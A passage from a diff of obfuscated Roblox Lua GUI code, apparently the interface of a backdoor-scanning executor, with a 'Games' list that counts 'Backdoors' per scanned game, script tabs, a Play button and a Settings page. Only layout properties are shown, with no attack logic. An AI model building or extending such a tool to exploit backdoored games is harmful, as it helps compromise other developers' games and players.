+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Active = false;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.ZIndex = 2;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Size = UDim2.new(0, 24, 0, 22);
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Selectable = false;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.BackgroundTransparency = 1;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Position = UDim2.new(0.169459969, 0, 0, 0);
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.ImageContent = Content;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Parent = fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b;
+
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Name = "Hitbox";
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.AutoButtonColor = true;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Active = false;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.ZIndex = 2;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Selectable = false;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.BackgroundTransparency = 1;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Text = "+";
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.TextWrapped = true;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.TextScaled = true;
+fd4hh21cgefg.g9g6080bba3f1b7a2h2d8e20939.Parent = fd4hh21cgefg.bgd0h0e840g603dd91g152ea;
+
+fd4hh21cgefg.eh97e0d900g0bff9c175.Name = "1";
+fd4hh21cgefg.eh97e0d900g0bff9c175.AutoButtonColor = true;
+fd4hh21cgefg.eh97e0d900g0bff9c175.Active = false;
+fd4hh21cgefg.eh97e0d900g0bff9c175.ZIndex = 2;
+fd4hh21cgefg.eh97e0d900g0bff9c175.Size = UDim2.new(0, 86, 0, 22);
+fd4hh21cgefg.eh97e0d900g0bff9c175.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.eh97e0d900g0bff9c175.Selectable = false;
+fd4hh21cgefg.eh97e0d900g0bff9c175.BackgroundTransparency = 1;
+fd4hh21cgefg.eh97e0d900g0bff9c175.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.eh97e0d900g0bff9c175.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.eh97e0d900g0bff9c175.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.eh97e0d900g0bff9c175.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.eh97e0d900g0bff9c175.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.eh97e0d900g0bff9c175.ImageContent = Content;
+fd4hh21cgefg.eh97e0d900g0bff9c175.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.eh97e0d900g0bff9c175.Parent = fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b;
+
+fd4hh21cgefg.b40429ec.Name = "Text";
+fd4hh21cgefg.b40429ec.AutoButtonColor = true;
+fd4hh21cgefg.b40429ec.Active = false;
+fd4hh21cgefg.b40429ec.ZIndex = 2;
+fd4hh21cgefg.b40429ec.Size = UDim2.new(0.63953495, 0, 1, 0);
+fd4hh21cgefg.b40429ec.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.b40429ec.Selectable = false;
+fd4hh21cgefg.b40429ec.BackgroundTransparency = 1;
+fd4hh21cgefg.b40429ec.Position = UDim2.new(0.151162788, 0, 0, 0);
+fd4hh21cgefg.b40429ec.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.b40429ec.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.b40429ec.Text = "Script 1";
+fd4hh21cgefg.b40429ec.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+fd4hh21cgefg.b40429ec.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.b40429ec.Parent = fd4hh21cgefg.eh97e0d900g0bff9c175;
+
+fd4hh21cgefg.ggc6fcd3d.Name = "X";
+fd4hh21cgefg.ggc6fcd3d.AutoButtonColor = true;
+fd4hh21cgefg.ggc6fcd3d.AnchorPoint = Vector2.new(1, 0.5);
+fd4hh21cgefg.ggc6fcd3d.ZIndex = 10;
+fd4hh21cgefg.ggc6fcd3d.Size = UDim2.new(0, 20, 0, 20);
+fd4hh21cgefg.ggc6fcd3d.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ggc6fcd3d.BackgroundTransparency = 1;
+fd4hh21cgefg.ggc6fcd3d.Position = UDim2.new(1, 0, 0.5, 0);
+fd4hh21cgefg.ggc6fcd3d.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.ggc6fcd3d.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ggc6fcd3d.Text = "x";
+fd4hh21cgefg.ggc6fcd3d.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.ggc6fcd3d.Parent = fd4hh21cgefg.eh97e0d900g0bff9c175;
+
+fd4hh21cgefg.be09744044h184197acddbf1346271.Name = "Hitbox";
+fd4hh21cgefg.be09744044h184197acddbf1346271.AutoButtonColor = true;
+fd4hh21cgefg.be09744044h184197acddbf1346271.ZIndex = 3;
+fd4hh21cgefg.be09744044h184197acddbf1346271.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.be09744044h184197acddbf1346271.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.be09744044h184197acddbf1346271.BackgroundTransparency = 1;
+fd4hh21cgefg.be09744044h184197acddbf1346271.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.be09744044h184197acddbf1346271.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.be09744044h184197acddbf1346271.Text = "";
+fd4hh21cgefg.be09744044h184197acddbf1346271.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.be09744044h184197acddbf1346271.TextTransparency = 1;
+fd4hh21cgefg.be09744044h184197acddbf1346271.Parent = fd4hh21cgefg.eh97e0d900g0bff9c175;
+
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Name = "Games";
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Visible = false;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.ZIndex = 0;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.BackgroundTransparency = 1;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Position = UDim2.new(0.000329297472, 0, -0.00299998512, 0);
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.ImageContent = Content;
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f.Parent = fd4hh21cgefg.cbe8abe5g3;
+
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.Name = "InnerBody";
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.LayoutOrder = 5;
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.ZIndex = 0;
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.BackgroundTransparency = 1;
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.a033ee89g2ea79heb14ff8829.Parent = fd4hh21cgefg.f75bbh633515e2090e0e1dg82e8f;
+
+fd4hh21cgefg.e08f9hbg05153f6319.Name = "Title";
+fd4hh21cgefg.e08f9hbg05153f6319.Size = UDim2.new(0, 100, 0, 40);
+fd4hh21cgefg.e08f9hbg05153f6319.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e08f9hbg05153f6319.BackgroundTransparency = 1;
+fd4hh21cgefg.e08f9hbg05153f6319.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e08f9hbg05153f6319.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e08f9hbg05153f6319.Text = "Games";
+fd4hh21cgefg.e08f9hbg05153f6319.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+fd4hh21cgefg.e08f9hbg05153f6319.Parent = fd4hh21cgefg.a033ee89g2ea79heb14ff8829;
+
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.Name = "ScrollingFrame";
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.Active = true;
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.Size = UDim2.new(1, 0, 1, -40);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.BorderSizePixel = 0;
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.BackgroundTransparency = 1;
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.Position = UDim2.new(0, 0, 0, 40);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.ScrollBarImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.ScrollBarThickness = 5;
+fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543.Parent = fd4hh21cgefg.a033ee89g2ea79heb14ff8829;
+
+fd4hh21cgefg.de8c6chce4aag4fd350666aca681.Name = "UIListLayout";
+fd4hh21cgefg.de8c6chce4aag4fd350666aca681.Padding = UDim.new(0, 5);
+fd4hh21cgefg.de8c6chce4aag4fd350666aca681.Parent = fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543;
+
+fd4hh21cgefg.ec96edb61a6fcd98d.Name = "dummy";
+fd4hh21cgefg.ec96edb61a6fcd98d.LayoutOrder = 1;
+fd4hh21cgefg.ec96edb61a6fcd98d.AnchorPoint = Vector2.new(1, 0);
+fd4hh21cgefg.ec96edb61a6fcd98d.Size = UDim2.new(1, -50, 0, 100);
+fd4hh21cgefg.ec96edb61a6fcd98d.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ec96edb61a6fcd98d.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ec96edb61a6fcd98d.Parent = fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543;
+
+fd4hh21cgefg.af8104b6.Name = "UICorner";
+fd4hh21cgefg.af8104b6.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.e98d7ddgc9f75151c0.Name = "GameIcon";
+fd4hh21cgefg.e98d7ddgc9f75151c0.Size = UDim2.new(0, 120, 0, 100);
+fd4hh21cgefg.e98d7ddgc9f75151c0.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e98d7ddgc9f75151c0.BackgroundTransparency = 1;
+fd4hh21cgefg.e98d7ddgc9f75151c0.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e98d7ddgc9f75151c0.ScaleType = Enum.ScaleType.Crop;
+fd4hh21cgefg.e98d7ddgc9f75151c0.Image = "rbxassetid://7007977848";
+fd4hh21cgefg.e98d7ddgc9f75151c0.ImageContent = Content;
+fd4hh21cgefg.e98d7ddgc9f75151c0.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.ffg64b989fe9ac.Name = "UICorner";
+fd4hh21cgefg.ffg64b989fe9ac.Parent = fd4hh21cgefg.e98d7ddgc9f75151c0;
+
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.Name = "fix";
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.AnchorPoint = Vector2.new(1, 0);
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.Size = UDim2.new(0, 5, 1, 0);
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.BorderSizePixel = 0;
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.Position = UDim2.new(1, 0, 0, 0);
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.haf845b3ag1g1b1d94ae78a.Parent = fd4hh21cgefg.e98d7ddgc9f75151c0;
+
+fd4hh21cgefg.ha97ee0ffe9053f.Name = "UIGradient";
+fd4hh21cgefg.ha97ee0ffe9053f.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.654902, 0.654902, 0.654902)), ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))});
+fd4hh21cgefg.ha97ee0ffe9053f.Rotation = 90;
+fd4hh21cgefg.ha97ee0ffe9053f.Parent = fd4hh21cgefg.haf845b3ag1g1b1d94ae78a;
+
+fd4hh21cgefg.cb26ch.Name = "UIGradient";
+fd4hh21cgefg.cb26ch.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.654902, 0.654902, 0.654902)), ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))});
+fd4hh21cgefg.cb26ch.Rotation = 90;
+fd4hh21cgefg.cb26ch.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.f51gfd.Name = "Title";
+fd4hh21cgefg.f51gfd.Size = UDim2.new(1, -180, 0, 40);
+fd4hh21cgefg.f51gfd.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f51gfd.BackgroundTransparency = 1;
+fd4hh21cgefg.f51gfd.Position = UDim2.new(0, 130, 0, 0);
+fd4hh21cgefg.f51gfd.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.f51gfd.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f51gfd.Text = "GameName";
+fd4hh21cgefg.f51gfd.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+fd4hh21cgefg.f51gfd.TextWrapped = true;
+fd4hh21cgefg.f51gfd.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.f51gfd.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.Name = "Backdoors";
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.Size = UDim2.new(0, 100, 0, 20);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.BackgroundTransparency = 1;
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.Position = UDim2.new(0, 130, 0, 40);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.Text = "- Backdoors: %d";
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.f35e12ga7f2bd9d7690h155d35.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.Name = "Date";
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.Size = UDim2.new(0, 100, 0, 20);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.BackgroundTransparency = 1;
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.Position = UDim2.new(0, 130, 0, 60);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.Text = "- Scanned on: %s";
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.gfab241360hfba0edf1b5a2.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.Name = "Play";
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.AnchorPoint = Vector2.new(1, 0);
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.Size = UDim2.new(0, 30, 1, 0);
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.Position = UDim2.new(1, 0, 0, 0);
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag.Parent = fd4hh21cgefg.ec96edb61a6fcd98d;
+
+fd4hh21cgefg.ec4fab9cdaa0aeaahf8b143ee27ee.Name = "UICorner";
+fd4hh21cgefg.ec4fab9cdaa0aeaahf8b143ee27ee.Parent = fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag;
+
+fd4hh21cgefg.f73600bb0218606.Name = "fix";
+fd4hh21cgefg.f73600bb0218606.Size = UDim2.new(0, 5, 1, 0);
+fd4hh21cgefg.f73600bb0218606.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f73600bb0218606.BorderSizePixel = 0;
+fd4hh21cgefg.f73600bb0218606.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f73600bb0218606.Parent = fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag;
+
+fd4hh21cgefg.abda22gf1226eeh.Name = "UIGradient";
+fd4hh21cgefg.abda22gf1226eeh.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.654902, 0.654902, 0.654902)), ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))});
+fd4hh21cgefg.abda22gf1226eeh.Rotation = 90;
+fd4hh21cgefg.abda22gf1226eeh.Parent = fd4hh21cgefg.f73600bb0218606;
+
+fd4hh21cgefg.e2e0a4hf5f0.Name = "Icon";
+fd4hh21cgefg.e2e0a4hf5f0.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.e2e0a4hf5f0.Size = UDim2.new(0, 15, 0, 15);
+fd4hh21cgefg.e2e0a4hf5f0.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e2e0a4hf5f0.BackgroundTransparency = 1;
+fd4hh21cgefg.e2e0a4hf5f0.Position = UDim2.new(0.5, 3, 0.5, 0);
+fd4hh21cgefg.e2e0a4hf5f0.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e2e0a4hf5f0.Image = "rbxassetid://7008236803";
+fd4hh21cgefg.e2e0a4hf5f0.ImageContent = Content;
+fd4hh21cgefg.e2e0a4hf5f0.Parent = fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag;
+
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.Name = "Hitbox";
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.AutoButtonColor = true;
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.BackgroundTransparency = 1;
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.Text = "";
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.TextTransparency = 1;
+fd4hh21cgefg.g096205d9d0h924e7d80bf49g36b77f.Parent = fd4hh21cgefg.d9e152a7gf3691e764fcd1gec33ag;
+
+fd4hh21cgefg.ha8ge55h60df3.Name = "info";
+fd4hh21cgefg.ha8ge55h60df3.Size = UDim2.new(1, 0, 0, 50);
+fd4hh21cgefg.ha8ge55h60df3.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ha8ge55h60df3.BackgroundTransparency = 1;
+fd4hh21cgefg.ha8ge55h60df3.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.ha8ge55h60df3.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ha8ge55h60df3.Text = "Scan games and save here all successfully scanned ones!";
+fd4hh21cgefg.ha8ge55h60df3.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.ha8ge55h60df3.TextWrapped = true;
+fd4hh21cgefg.ha8ge55h60df3.Parent = fd4hh21cgefg.bfg18bf5231d9be1e88a6agbd77f543;
+
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Name = "Settings";
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Visible = false;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.ZIndex = 2;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.BackgroundTransparency = 1;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Position = UDim2.new(0, 0, -0.00300000003, 0);
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.ImageContent = Content;
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.c4ff0d98fef1cef8199de995a5.Parent = fd4hh21cgefg.cbe8abe5g3;
+
+fd4hh21cgefg.c160dba83922b10b0h.Name = "Borders";
+fd4hh21cgefg.c160dba83922b10b0h.Parent = fd4hh21cgefg.c4ff0d98fef1cef8199de995a5;
+
+fd4hh21cgefg.chcfe5cah6d5f2366e.Name = "Frame";
+fd4hh21cgefg.chcfe5cah6d5f2366e.Size = UDim2.new(0, 9, 0, 313);
+fd4hh21cgefg.chcfe5cah6d5f2366e.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.chcfe5cah6d5f2366e.BorderSizePixel = 0;
+fd4hh21cgefg.chcfe5cah6d5f2366e.Position = UDim2.new(-9.13699978e-08, 0, 0, 0);
+fd4hh21cgefg.chcfe5cah6d5f2366e.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.chcfe5cah6d5f2366e.Parent = fd4hh21cgefg.c160dba83922b10b0h;
+
+fd4hh21cgefg.g6d0c3904a6fgfe.Name = "Frame";
+fd4hh21cgefg.g6d0c3904a6fgfe.Size = UDim2.new(0, 663, 0, 6);
+fd4hh21cgefg.g6d0c3904a6fgfe.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g6d0c3904a6fgfe.BorderSizePixel = 0;
+fd4hh21cgefg.g6d0c3904a6fgfe.Position = UDim2.new(-4.59639651e-08, 0, 0, 0);
+fd4hh21cgefg.g6d0c3904a6fgfe.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g6d0c3904a6fgfe.Parent = fd4hh21cgefg.c160dba83922b10b0h;
+
+fd4hh21cgefg.fg68dafgh7ad5afh.Name = "InnerBody";
+fd4hh21cgefg.fg68dafgh7ad5afh.LayoutOrder = 5;
+fd4hh21cgefg.fg68dafgh7ad5afh.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.fg68dafgh7ad5afh.ZIndex = 2;
+fd4hh21cgefg.fg68dafgh7ad5afh.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.fg68dafgh7ad5afh.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fg68dafgh7ad5afh.BackgroundTransparency = 1;
+fd4hh21cgefg.fg68dafgh7ad5afh.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.fg68dafgh7ad5afh.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.fg68dafgh7ad5afh.Parent = fd4hh21cgefg.c4ff0d98fef1cef8199de995a5;
+
+fd4hh21cgefg.gc4f56000.Name = "Title";
+fd4hh21cgefg.gc4f56000.Size = UDim2.new(0, 100, 0, 40);
+fd4hh21cgefg.gc4f56000.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gc4f56000.BackgroundTransparency = 1;
+fd4hh21cgefg.gc4f56000.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.gc4f56000.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gc4f56000.Text = "Settings";
+fd4hh21cgefg.gc4f56000.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+fd4hh21cgefg.gc4f56000.Parent = fd4hh21cgefg.fg68dafgh7ad5afh;
+
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.Name = "ScrollingFrame";
